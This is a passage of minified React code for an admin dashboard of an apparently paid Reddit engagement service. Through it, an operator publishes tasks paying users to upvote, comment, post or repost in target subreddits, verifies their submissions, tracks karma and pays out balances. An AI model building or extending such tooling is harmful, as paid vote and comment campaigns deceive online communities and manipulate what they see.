shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:"Paid"}),s.jsxs("button",{onClick:()=>E("Reports"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all relative ${w==="Reports"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:["Reports",v.length>0&&s.jsx("span",{className:"absolute -top-1 -right-1 w-4 h-4 bg-red-500 rounded-full text-[8px] flex items-center justify-center animate-pulse",children:v.length})]})]}),w==="Tasks"?s.jsxs(s.Fragment,{children:[s.jsxs("form",{onSubmit:cn,className:"space-y-6 sm:space-y-8",children:[s.jsxs("div",{className:"grid grid-cols-1 sm:grid-cols-2 gap-4 sm:gap-8",children:[s.jsxs("div",{className:"space-y-3",children:[s.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[s.jsx(Ds,{size:14})," Task Tier"]}),s.jsxs("div",{className:"relative",ref:Tr,children:[s.jsxs("div",{onClick:()=>Cr(!hr),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl flex items-center justify-between cursor-pointer hover:border-blue-500/50 transition-all text-sm group",children:[s.jsx("span",{className:"text-white font-medium",children:_e}),s.jsx(cr,{size:18,className:`text-gray-500 transition-transform ${hr?"rotate-180":""}`})]}),hr&&s.jsx("div",{className:"absolute top-full left-0 right-0 mt-2 p-2 bg-[#0a0a0a] border border-white/10 rounded-2xl shadow-2xl z-50 animate-in fade-in slide-in-from-top-2 duration-200",children:["Tier 1","Tier 2","Tier 3"].map(p=>s.jsx("div",{onClick:()=>{Q(p),Cr(!1)},className:`px-4 py-3 rounded-xl text-xs font-bold cursor-pointer transition-all mb-1 last:mb-0 ${_e===p?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-400 hover:bg-white/5 hover:text-white"}`,children:p},p))})]})]}),s.jsxs("div",{className:"space-y-3",children:[s.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[s.jsx(pl,{size:14})," Subreddit"]}),s.jsx("input",{type:"text",required:!0,placeholder:"e.g. MovingToLondon",value:fe,onChange:p=>xe(p.target.value),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 shadow-inner"})]}),s.jsxs("div",{className:"space-y-3",children:[s.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[s.jsx(Pf,{size:14})," Task Title"]}),s.jsx("input",{type:"text",required:!0,placeholder:"e.g. Upvote and Comment on r/tech",value:je,onChange:p=>Ce(p.target.value),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 shadow-inner"})]}),s.jsxs("div",{className:"space-y-3",children:[s.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[s.jsx(ml,{size:14})," Category"]}),s.jsxs("div",{className:"relative",ref:fr,children:[s.jsxs("div",{onClick:()=>Pr(!Rr),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl flex items-center justify-between cursor-pointer hover:border-blue-500/50 transition-all text-sm group",children:[s.jsx("span",{className:"text-white font-bold uppercase tracking-tight",children:B}),s.jsx(cr,{size:18,className:`text-gray-500 transition-transform ${Rr?"rotate-180":""}`})]}),Rr&&s.jsx("div",{className:"absolute top-full left-0 right-0 mt-2 p-2 bg-[#0a0a0a] border border-white/10 rounded-2xl shadow-2xl z-50 animate-in fade-in slide-in-from-top-2 duration-200",children:["COMMENT","POST","UPVOTE","REPLY TO COMMENT","REPOST"].map(p=>s.jsx("div",{onClick:()=>{Ae(p),Pr(!1)},className:`px-4 py-3 rounded-xl text-[10px] font-black cursor-pointer transition-all mb-1 last:mb-0 tracking-widest uppercase ${B===p?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-400 hover:bg-white/5 hover:text-white"}`,children:p},p))})]})]}),s.jsxs("div",{className:"space-y-3",children:[s.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[s.jsx(Os,{size:14})," Reward Amount"]}),s.jsxs("div",{className:"relative",children:[s.jsx("span",{className:"absolute left-5 top-1/2 -translate-y-1/2 text-gray-500 text-sm",children:"$"}),s.jsx("input",{type:"text",required:!0,placeholder:"0.50",value:et,onChange:p=>ct(p.target.value),className:"w-full pl-10 pr-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 shadow-inner"})]})]}),s.jsxs("div",{className:"space-y-3",children:[s.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[s.jsx(Fr,{size:14})," Deadline"]}),s.jsxs("div",{className:"relative",ref:Ft,children:[s.jsxs("div",{onClick:()=>os(!er),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl flex items-center justify-between cursor-pointer hover:border-blue-500/50 transition-all text-sm group",children:[s.jsx("span",{className:Ne?"text-white font-medium":"text-gray-600",children:Ne?new Date(Ne).toLocaleString([],{dateStyle:"medium",timeStyle:"short"}):"Select date and time"}),s.jsx(Fr,{size:18,className:`text-gray-500 group-hover:text-blue-500 transition-colors ${er?"text-blue-500":""}`})]}),er&&s.jsxs("div",{className:"absolute top-full left-0 right-0 sm:right-auto sm:w-80 mt-2 p-4 bg-[#0a0a0a] border border-white/10 rounded-3xl shadow-2xl z-[60] animate-in fade-in slide-in-from-top-2 duration-200",children:[s.jsxs("div",{className:"flex items-center justify-between mb-4 px-1",children:[s.jsx("button",{type:"button",onClick:()=>zs(new Date(Oe.getFullYear(),Oe.getMonth()-1)),className:"p-1.5 hover:bg-white/5 rounded-lg text-gray-400 transition-colors",children:s.jsx(cr,{size:18,className:"rotate-90"})}),s.jsx("span",{className:"text-xs font-black uppercase italic tracking-widest text-blue-500",children:new Intl.DateTimeFormat("en-US",{month:"long",year:"numeric"}).format(Oe)}),s.jsx("button",{type:"button",onClick:()=>zs(new Date(Oe.getFullYear(),Oe.getMonth()+1)),className:"p-1.5 hover:bg-white/5 rounded-lg text-gray-400 transition-colors",children:s.jsx(cr,{size:18,className:"-rotate-90"})})]}),s.jsxs("div",{className:"grid grid-cols-7 gap-1 mb-2",children:[["S","M","T","W","T","F","S"].map(p=>s.jsx("div",{className:"text-[10px] font-black text-gray-600 text-center py-1 uppercase",children:p},p)),Array.from({length:new Date(Oe.getFullYear(),Oe.getMonth(),1).getDay()}).map((p,O)=>s.jsx("div",{},`empty-${O}`)),Array.from({length:new Date(Oe.getFullYear(),Oe.getMonth()+1,0).getDate()}).map((p,O)=>{const L=O+1,W=Ne&&new Date(Ne).getDate()===L&&new Date(Ne).getMonth()===Oe.getMonth()&&new Date(Ne).getFullYear()===Oe.getFullYear();return s.jsx("div",{onClick:()=>{const G=new Date(Oe.getFullYear(),Oe.getMonth(),L),Tt=Ne?new Date(Ne):new Date;G.setHours(Tt.getHours()),G.setMinutes(Tt.getMinutes());const Le=Te=>Te.toString().padStart(2,"0");kt(`${G.getFullYear()}-${Le(G.getMonth()+1)}-${Le(G.getDate())}T${Le(G.getHours())}:${Le(G.getMinutes())}`)},className:`aspect-square flex items-center justify-center text-[11px] font-bold rounded-lg cursor-pointer transition-all ${W?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-400 hover:bg-white/5 hover:text-white"}`,children:L},L)})]}),s.jsxs("div",{className:"mt-4 pt-4 border-t border-white/5 flex items-center justify-between gap-4",children:[s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx(Fr,{size:14,className:"text-gray-500"}),s.jsx("span",{className:"text-[10px] font-bold text-gray-500 uppercase tracking-wider",children:"Time"})]}),s.jsxs("div",{className:"flex items-center gap-1",children:[s.jsx("input",{type:"number",min:"0",max:"23",value:Ne?new Date(Ne).getHours():12,onChange:p=>{const O=Math.max(0,Math.min(23,parseInt(p.target.value)||0)),L=Ne?new Date(Ne):new Date;L.setHours(O);const W=G=>G.toString().padStart(2,"0");kt(`${L.getFullYear()}-${W(L.getMonth()+1)}-${W(L.getDate())}T${W(L.getHours())}:${W(L.getMinutes())}`)},className:"w-10 py-1 bg-white/5 border border-white/5 rounded-md text-center text-xs font-bold focus:border-blue-500 outline-none"}),s.jsx("span",{className:"text-gray-600 font-bold",children:":"}),s.jsx("input",{type:"number",min:"0",max:"59",value:Ne?new Date(Ne).getMinutes():0,onChange:p=>{const O=Math.max(0,Math.min(59,parseInt(p.target.value)||0)),L=Ne?new Date(Ne):new Date;L.setMinutes(O);const W=G=>G.toString().padStart(2,"0");kt(`${L.getFullYear()}-${W(L.getMonth()+1)}-${W(L.getDate())}T${W(L.getHours())}:${W(L.getMinutes())}`)},className:"w-10 py-1 bg-white/5 border border-white/5 rounded-md text-center text-xs font-bold focus:border-blue-500 outline-none"})]})]})]})]})]})]}),s.jsxs("div",{className:"space-y-3",children:[s.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[s.jsx(pl,{size:14})," Target Reddit URL"]}),s.jsx("input",{type:"url",required:!0,placeholder:"https://www.reddit.com/r/...",value:dr,onChange:p=>it(p.target.value),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 shadow-inner"})]}),s.jsxs("div",{className:"space-y-3",children:[s.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[s.jsx(ss,{size:14})," Assign to User"]}),s.jsxs("div",{className:"relative",ref:pr,children:[s.jsxs("div",{onClick:()=>tr(!Ar),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl flex items-center justify-between cursor-pointer hover:border-blue-500/50 transition-all text-sm group",children:[s.jsx("span",{className:st==="All"?"text-gray-500":"text-white font-medium",children:un}),s.jsx(cr,{size:18,className:`text-gray-500 transition-transform ${Ar?"rotate-180":""}`})]}),Ar&&s.jsxs("div",{className:"absolute top-full left-0 right-0 mt-2 p-3 bg-[#0a0a0a] border border-white/10 rounded-2xl shadow-2xl z-50 animate-in fade-in slide-in-from-top-2 duration-200",children:[s.jsxs("div",{className:"relative mb-3",children:[s.jsx(Gc,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500",size:14}),s.jsx("input",{type:"text",placeholder:"Search server or reddit name...",value:Bt,onChange:p=>Br(p.target.value),autoFocus:!0,className:"w-full pl-10 pr-4 py-2.5 bg-white/[0.05] border border-white/5 rounded-xl focus:outline-none focus:border-blue-500 transition-all text-xs"})]}),s.jsxs("div",{className:"max-h-60 overflow-y-auto space-y-1 custom-scrollbar",children:[s.jsx("div",{onClick:()=>{_t("All"),tr(!1)},className:`px-4 py-2.5 rounded-xl text-xs font-bold cursor-pointer transition-all ${st==="All"?"bg-blue-600 text-white":"text-gray-400 hover:bg-white/5 hover:text-white"}`,children:"Everyone (Public)"}),qt.map(p=>s.jsxs("div",{onClick:()=>{_t(p.email),tr(!1)},className:`px-4 py-2.5 rounded-xl text-xs cursor-pointer transition-all ${st===p.email?"bg-blue-600 text-white font-bold":"text-gray-400 hover:bg-white/5 hover:text-white"}`,children:[s.jsx("div",{className:"font-bold",children:p.server_username||p.email.split("@")[0]}),s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsxs("div",{className:"text-[10px] opacity-60",children:["u/",p.reddit_username||"not_connected"]}),p.reddit_karma!=null?s.jsxs("div",{className:"text-[10px] opacity-60 text-blue-400",children:[" ",p.reddit_karma.toLocaleString()," karma"]}):p.reddit_username&&p.reddit_username!=="not_connected"?s.jsx("div",{className:"text-[10px] opacity-40 text-blue-400 animate-pulse",children:" fetching karma..."}):null,p.discord_username&&s.jsxs("div",{className:"text-[10px] opacity-60 flex items-center gap-1",children:[s.jsx(Er,{size:10})," ",p.discord_username]})]})]},p.email)),qt.length===0&&Bt!==""&&s.jsxs("div",{className:"py-8 text-center text-gray-600 text-xs italic",children:['No users found matching "',Bt,'"']})]})]})]}),s.jsx("p",{className:"text-[10px] text-gray-600 ml-1",children:"Select a specific user or keep it public."})]}),s.jsxs("div",{className:"space-y-3",children:[s.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:"Instructions for Users"}),s.jsx("textarea",{rows:5,required:!0,placeholder:"Detail exactly what the user needs to do...",value:ft,onChange:p=>At(p.target.value),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 resize-none shadow-inner"})]}),s.jsxs("div",{className:"flex flex-col sm:flex-row gap-4 pt-6",children:[s.jsxs("button",{type:"button",onClick:mr,className:"w-full sm:w-auto px-8 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all flex items-center justify-center gap-2",children:[s.jsx($s,{size:18}),_?"Cancel Edit":"Reset Form"]}),s.jsxs("button",{type:"submit",className:"w-full sm:flex-1 py-4 bg-blue-600 text-white rounded-2xl font-bold text-sm hover:bg-blue-700 transition-all shadow-xl shadow-blue-600/20 flex items-center justify-center gap-2 group",children:[s.jsx(Vn,{size:18,className:"group-hover:translate-x-1 group-hover:-translate-y-1 transition-transform"}),_?"Update Task":"Publish Task to Network"]})]})]}),s.jsxs("section",{className:"mt-20",children:[s.jsx("h2",{className:"text-xl font-bold mb-8",children:"Existing Tasks"}),s.jsx("div",{className:"space-y-4",children:c.filter(p=>p.status!=="verified").length>0?c.filter(p=>p.status!=="verified").map(p=>s.jsx("div",{className:`p-6 rounded-3xl border transition-all ${p.is_hidden?"bg-white/[0.01] border-white/5 opacity-50":"bg-white/[0.03] border-white/10"}`,children:s.jsxs("div",{className:"flex items-center justify-between gap-4",children:[s.jsxs("div",{className:"flex-1",children:[s.jsxs("div",{className:"flex items-center gap-3 mb-1",children:[s.jsx("span",{className:"text-xs font-black text-blue-500",children:p.task_id_display}),s.jsx("h3",{className:"font-bold",children:p.title}),s.jsx("span",{className:`text-[9px] uppercase font-black px-2 py-0.5 rounded ${p.tier==="Tier 3"?"bg-red-500/10 text-red-500":p.tier==="Tier 2"?"bg-amber-500/10 text-amber-500":"bg-emerald-500/10 text-emerald-500"}`,children:p.tier}),s.jsx("span",{className:"text-[10px] uppercase font-bold text-gray-500 bg-white/5 px-2 py-0.5 rounded",children:p.category}),s.jsx("span",{className:`text-[10px] font-bold px-2 py-0.5 rounded ${p.assigned_to==="All"?"text-emerald-500 bg-emerald-500/10":"text-orange-500 bg-orange-500/10"}`,children:p.assigned_to==="All"?"PUBLIC":`PRIVATE: ${p.assigned_to}`})]}),s.jsx("p",{className:"text-xs text-gray-500 truncate max-w-md",children:p.reddit_url})]}),s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx("button",{onClick:()=>Jn(p),className:"p-2 hover:bg-white/10 rounded-lg text-gray-400",title:p.is_hidden?"Show":"Hide",children:p.is_hidden?s.jsx(Ef,{size:18}):s.jsx(Hc,{size:18})}),s.jsx("button",{onClick:()=>Ls(p),className:"p-2 hover:bg-blue-600/20 rounded-lg text-blue-500",title:"Edit",children:s.jsx(Kc,{size:18})}),s.jsx("button",{onClick:()=>Wr(p.id),className:"p-2 hover:bg-red-600/20 rounded-lg text-red-500",title:"Delete",children:s.jsx($s,{size:18})})]})]})},p.id)):s.jsx("p",{className:"text-gray-500 text-center py-10",children:"No active tasks found in database."})})]})]}):w==="Verification"?s.jsxs("section",{className:"space-y-6 animate-in fade-in slide-in-from-right-4 duration-500",children:[s.jsx("h2",{className:"text-xl font-bold mb-8 italic uppercase tracking-tight",children:"Pending Submissions"}),c.filter(p=>p.status==="submitted").length>0?c.filter(p=>p.status==="submitted").map(p=>s.jsx("div",{className:"bg-white/[0.02] border border-white/5 rounded-[32px] p-5 sm:p-8 hover:border-blue-500/20 transition-all",children:s.jsxs("div",{className:"flex flex-col md:flex-row justify-between gap-6",children:[s.jsxs("div",{className:"flex-1 space-y-4",children:[s.jsxs("div",{className:"flex items-center gap-3",children:[s.jsx("span",{className:"text-[10px] font-black text-blue-500",children:p.task_id_display}),s.jsx("h3",{className:"font-bold text-white text-lg",children:p.title}),s.jsx("span",{className:"text-[9px] font-black bg-amber-500/10 text-amber-500 px-2 py-0.5 rounded uppercase",children:p.tier})]}),s.jsxs("div",{className:"flex flex-wrap gap-4 text-[11px] text-gray-500",children:[s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx(ss,{size:14}),s.jsx("span",{className:"font-bold text-gray-300",children:p.claimed_by})]}),s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx(Os,{size:14}),s.jsx("span",{className:"font-bold text-emerald-500",children:p.reward})]})]}),s.jsxs("div",{className:"space-y-3 pt-4",children:[s.jsxs("div",{className:"p-4 bg-black/40 rounded-2xl border border-white/5",children:[s.jsx("span",{className:"text-[9px] font-black text-gray-600 uppercase tracking-widest block mb-2",children:"Main Link"}),s.jsx("a",{href:p.submission_data?.main_link,target:"_blank",rel:"noreferrer",className:"text-xs text-blue-500 hover:underline break-all",children:p.submission_data?.main_link})]}),p.submission_data?.random_comments&&p.submission_data.random_comments.some(O=>O!=="")&&s.jsxs("div",{className:"p-4 bg-black/40 rounded-2xl border border-white/5",children:[s.jsx("span",{className:"text-[9px] font-black text-gray-600 uppercase tracking-widest block mb-2",children:"Random Comments"}),s.jsx("div",{className:"space-y-2",children:p.submission_data.random_comments.map((O,L)=>O&&s.jsxs("a",{href:O,target:"_blank",rel:"noreferrer",className:"text-[10px] text-gray-400 hover:text-white block hover:underline truncate",children:[L+1,". ",O]},L))})]})]})]}),s.jsxs("div",{className:"flex flex-row md:flex-col gap-3 justify-end",children:[s.jsxs("button",{onClick:()=>qr(p),className:"flex-1 md:flex-none px-8 py-4 bg-emerald-600 text-white rounded-2xl font-black text-sm hover:bg-emerald-700 transition-all shadow-lg shadow-emerald-600/20 flex items-center justify-center gap-2",children:[s.jsx(jt,{size:18,strokeWidth:3}),"VERIFY"]}),s.jsxs("button",{onClick:()=>cs(p),className:"flex-1 md:flex-none px-8 py-4 bg-red-600 text-white rounded-2xl font-black text-sm hover:bg-red-700 transition-all shadow-lg shadow-red-600/20 flex items-center justify-center gap-2",children:[s.jsx(De,{size:18,strokeWidth:3}),"REJECT"]}),s.jsxs("button",{onClick:()=>$r(p.claimed_by),className:"flex-1 md:flex-none px-8 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/10 transition-all flex items-center justify-center gap-2",children:[s.jsx(Er,{size:18}),"ALERT"]})]})]})},p.id)):s.jsxs("div",{className:"py-20 text-center bg-white/[0.01] border border-dashed border-white/10 rounded-[32px]",children:[s.jsx(rs,{size:48,className:"mx-auto text-gray-700 mb-4"}),s.jsx("p",{className:"text-gray-500 font-bold uppercase tracking-widest text-xs",children:"All caught up! No pending submissions."})]})]}):w==="Users"?s.jsxs("section",{className:"space-y-6 animate-in fade-in slide-in-from-right-4 duration-500",children:[s.jsxs("div",{className:"flex items-center justify-between mb-8",children:[s.jsxs("div",{className:"flex items-center gap-4",children:[s.jsx("h2",{className:"text-xl font-bold italic uppercase tracking-tight",children:"Registered Users"}),s.jsx("button",{onClick:()=>Ir(!0),className:"p-2 hover:bg-white/5 rounded-xl text-gray-500 hover:text-blue-500 transition-all group",title:"Refresh Karma for everyone",children:s.jsx(Fr,{size:16,className:"group-hover:rotate-180 transition-transform duration-500"})})]}),s.jsxs("div",{className:"px-4 py-2 bg-white/[0.03] border border-white/5 rounded-2xl",children:[s.jsx("span",{className:"text-[10px] font-black text-gray-500 uppercase tracking-widest",children:"Total: "}),s.jsx("span",{className:"text-sm font-black text-white",children:h.length})]})]}),h.length>0?s.jsx("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4",children:h.map(p=>{const O=c.filter(G=>G.claimed_by===p.email&&(G.status==="verified"||G.status==="submitted")),L=M===p.email,W=x.filter(G=>G.user_email===p.email&&G.status==="pending");return s.jsxs("div",{className:`bg-white/[0.02] border rounded-[28px] p-4 sm:p-6 transition-all ${W.length>0?"border-red-500/30":"border-white/5 hover:border-blue-500/20"}`,children:[s.jsxs("div",{className:"flex items-start gap-4 mb-4",children:[s.jsxs("div",{className:"relative",children:[s.jsx("div",{className:"w-12 h-12 bg-gradient-to-br from-blue-600 to-purple-600 rounded-2xl flex items-center justify-center text-white font-black text-lg flex-shrink-0",children:(p.server_username||p.email)[0].toUpperCase()}),W.length>0&&s.jsx("div",{className:"absolute -top-1 -right-1 w-4 h-4 bg-red-500 border-2 border-[#0a0a0a] rounded-full animate-pulse shadow-lg shadow-red-500/40"})]}),s.jsxs("div",{className:"flex-1 min-w-0",children:[s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx("h3",{className:"font-bold text-white text-sm truncate",children:p.server_username||p.email.split("@")[0]}),W.length>0&&s.jsx("span",{className:"text-[8px] font-black bg-red-500/10 text-red-500 px-1.5 py-0.5 rounded uppercase tracking-tighter",children:"Withdrawal Req"})]}),s.jsx("p",{className:"text-[11px] text-gray-500 truncate",children:p.email}),p.reddit_username&&s.jsxs("div",{className:"flex items-center gap-2 mt-1",children:[s.jsxs("a",{href:`https://reddit.com/u/${p.reddit_username}`,target:"_blank",rel:"noreferrer",className:"text-[10px] text-orange-500 font-bold hover:underline flex items-center gap-1",children:["u/",p.reddit_username,s.jsx(Fa,{size:10})]}),p.reddit_karma!=null?s.jsxs("span",{className:"text-[10px] text-blue-400 font-bold",children:[" ",p.reddit_karma.toLocaleString()," karma"]}):s.jsx("span",{className:"text-[10px] text-blue-400/40 font-bold animate-pulse",children:" fetching..."})]})]})]}),s.jsxs("div",{className:"grid grid-cols-1 gap-2 mb-4",children:[s.jsxs("div",{className:"flex items-center justify-between p-3 bg-emerald-500/5 border border-emerald-500/10 rounded-xl",children:[s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx(Hn,{size:14,className:"text-emerald-500"}),s.jsx("span",{className:"text-[10px] font-bold text-gray-400 uppercase",children:"Current Balance"})]}),s.jsxs("span",{className:"text-sm font-black text-emerald-500",children:["$",(p.balance||0).toFixed(2)]})]}),W.length>0&&s.jsx("div",{className:"space-y-2",children:W.map(G=>s.jsxs("div",{className:"p-3 bg-red-500/5 border border-red-500/10 rounded-xl",children:[s.jsxs("div",{className:"flex items-center justify-between mb-2",children:[s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx(Os,{size:14,className:"text-red-500"}),s.jsxs("div",{className:"flex flex-col",children:[s.jsx("span",{className:"text-[10px] font-black text-red-500 uppercase",children:"Withdrawal Request"}),s.jsx("span",{className:"text-[9px] font-mono text-gray-500",children:G.transaction_id})]})]}),s.jsxs("span",{className:"text-sm font-black text-red-500",children:["$",G.amount.toFixed(2)]})]}),s.jsxs("div",{className:"flex items-center justify-between gap-3 px-2 py-1.5 bg-white/[0.03] rounded-lg",children:[s.jsxs("div",{className:"flex items-center gap-2 flex-1 min-w-0",children:[s.jsx("img",{src:cl[G.payout_method.type],alt:G.payout_method.label,className:"w-3.5 h-3.5 object-contain"}),s.jsxs("div",{className:"flex flex-col min-w-0",children:[s.jsx("span",{className:"text-[9px] font-black text-gray-400 uppercase leading-none mb-0.5",children:G.payout_method.label}),s.jsx("span",{className:"text-[10px] font-bold text-gray-200 truncate",children:G.payout_method.value})]})]}),s.jsx("button",{onClick:()=>Yn(G),className:"px-3 py-1 bg-emerald-600 hover:bg-emerald-700 text-white text-[9px] font-black rounded-lg transition-all shadow-lg shadow-emerald-600/10 whitespace-nowrap",children:"PAID"})]})]},G.id))})]}),s.jsxs("div",{className:"mb-4",children:[s.jsxs("div",{className:"flex items-center gap-2 mb-2",children:[s.jsx(jl,{size:14,className:"text-gray-500"}),s.jsx("span",{className:"text-[10px] font-bold text-gray-400 uppercase",children:"Payout Methods"})]}),p.payout_methods&&p.payout_methods.length>0?s.jsx("div",{className:"flex flex-wrap gap-2",children:p.payout_methods.map(G=>s.jsxs("div",{className:"flex items-center gap-2 px-3 py-1.5 bg-white/[0.03] border border-white/5 rounded-xl",children:[s.jsx("img",{src:cl[G.type],alt:G.label,className:"w-4 h-4 object-contain"}),s.jsx("span",{className:"text-[10px] font-bold text-gray-300 truncate max-w-[100px]",children:G.value})]},G.id))}):s.jsx("p",{className:"text-[10px] text-gray-600 italic",children:"No payout methods"})]}),s.jsxs("div",{children:[s.jsxs("button",{onClick:()=>be(L?null:p.email),className:"w-full flex items-center justify-between p-3 bg-white/[0.02] border border-white/5 rounded-xl hover:bg-white/[0.04] transition-all",children:[s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx(rs,{size:14,className:"text-blue-500"}),s.jsx("span",{className:"text-[10px] font-bold text-gray-400 uppercase",children:"Completed Tasks"})]}),s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx("span",{className:"text-xs font-black text-white",children:O.length}),s.jsx(cr,{size:14,className:`text-gray-500 transition-transform ${L?"rotate-180":""}`})]})]}),L&&O.length>0&&s.jsx("div",{className:"mt-2 p-3 bg-black/40 rounded-xl border border-white/5 space-y-2 max-h-48 overflow-y-auto",children:O.map(G=>s.jsxs("div",{className:"flex items-center justify-between gap-2 p-2 bg-white/[0.02] rounded-lg",children:[s.jsxs("div",{className:"flex-1 min-w-0",children:[s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx("span",{className:"text-[9px] font-black text-blue-500",children:G.task_id_display}),s.jsx("span",{className:`text-[8px] font-black px-1.5 py-0.5 rounded uppercase ${G.status==="verified"?"bg-emerald-500/10 text-emerald-500":"bg-amber-500/10 text-amber-500"}`,children:G.status})]}),s.jsx("p",{className:"text-[10px] text-gray-300 truncate",children:G.title})]}),G.submission_data?.main_link&&s.jsx("a",{href:G.submission_data.main_link,target:"_blank",rel:"noreferrer",className:"p-1.5 text-gray-500 hover:text-blue-500 hover:bg-blue-500/10 rounded-lg transition-all flex-shrink-0",title:"View submission",children:s.jsx(Fa,{size:12})})]},G.id))}),L&&O.length===0&&s.jsx("div",{className:"mt-2 p-4 bg-black/40 rounded-xl border border-white/5 text-center",children:s.jsx("p",{className:"text-[10px] text-gray-600",children:"No tasks completed yet"})})]})]},p.email)})}):s.jsxs("div",{className:"py-20 text-center bg-white/[0.01] border border-dashed border-white/10 rounded-[32px]",children:[s.jsx(Jc,{size:48,className:"mx-auto text-gray-700 mb-4"}),s.jsx("p",{className:"text-gray-500 font-bold uppercase tracking-widest text-xs",children:"No users registered yet."})]})]}):w==="Reports"?s.jsxs("section",{className:"space-y-6 animate-in fade-in slide-in-from-right-4 duration-500",children:[s.jsxs("div",{className:"flex items-center justify-between mb-8",children:[s.jsx("h2",{className:"text-xl font-bold italic uppercase tracking-tight",children:"User Reported Issues"}),s.jsxs("div",{className:"px-4 py-2 bg-white/[0.03] border border-white/5 rounded-2xl",children:[s.jsx("span",{className:"text-[10px] font-black text-gray-500 uppercase tracking-widest",children:"Active: "}),s.jsx("span",{className:"text-sm font-black text-white",children:v.length})]})]}),s.jsx("div",{className:"space-y-4",children:v.length>0?v.map(p=>s.jsx("div",{className:"bg-white/[0.02] border border-white/5 p-6 rounded-[32px] group hover:border-red-500/20 transition-all",children:s.jsxs("div",{className:"flex flex-col sm:flex-row justify-between items-start gap-6",children:[s.jsxs("div",{className:"flex-1 space-y-4",children:[s.jsxs("div",{className:"flex items-center gap-3",children:[s.jsx("div",{className:"w-10 h-10 bg-red-500/10 rounded-xl flex items-center justify-center border border-red-500/20 text-red-500",children:s.jsx(at,{size:20})}),s.jsxs("div",{children:[s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx("span",{className:"text-[10px] font-black text-red-500 uppercase tracking-widest",children:"Reported Problem"}),s.jsx("span",{className:"text-gray-700 text-[10px]",children:""}),s.jsx("span",{className:"text-[10px] font-bold text-gray-500 uppercase",children:new Date(p.created_at).toLocaleString()})]}),s.jsx("h4",{className:"text-sm font-bold text-white mt-0.5",children:p.message.split(" | ")[2]?.replace("PROBLEM: ","")||"No details provided"})]})]}),s.jsxs("div",{className:"grid grid-cols-1 sm:grid-cols-2 gap-4",children:[s.jsxs("div",{className:"px-4 py-3 bg-black/40 rounded-2xl border border-white/5",children:[s.jsx("span",{className:"text-[9px] font-black text-gray-600 uppercase tracking-widest block mb-1",children:"User Email"}),s.jsx("span",{className:"text-xs text-gray-300 font-bold",children:p.message.split(" | ")[0]?.replace("FROM: ","")||"Unknown"})]}),s.jsxs("div",{className:"px-4 py-3 bg-black/40 rounded-2xl border border-white/5",children:[s.jsx("span",{className:"text-[9px] font-black text-gray-600 uppercase tracking-widest block mb-1",children:"Task ID"}),s.jsx("span",{className:"text-xs text-blue-500 font-black",children:p.message.split(" | ")[1]?.replace("TASK: ","")||"N/A"})]})]})]}),s.jsxs("div",{className:"flex flex-row sm:flex-col gap-2 w-full sm:w-auto",children:[s.jsxs("button",{onClick:()=>$r(p.message.split(" | ")[0]?.replace("FROM: ","")),className:"flex-1 sm:flex-none px-6 py-3 bg-blue-600/10 text-blue-500 rounded-xl font-bold text-xs hover:bg-blue-600 hover:text-white transition-all flex items-center justify-center gap-2",children:[s.jsx(Er,{size:16}),"REPLY"]}),s.jsxs("button",{onClick:()=>ln(p.id),className:"flex-1 sm:flex-none px-6 py-3 bg-white/[0.03] border border-white/10 text-gray-500 rounded-xl font-bold text-xs hover:text-white hover:bg-red-600 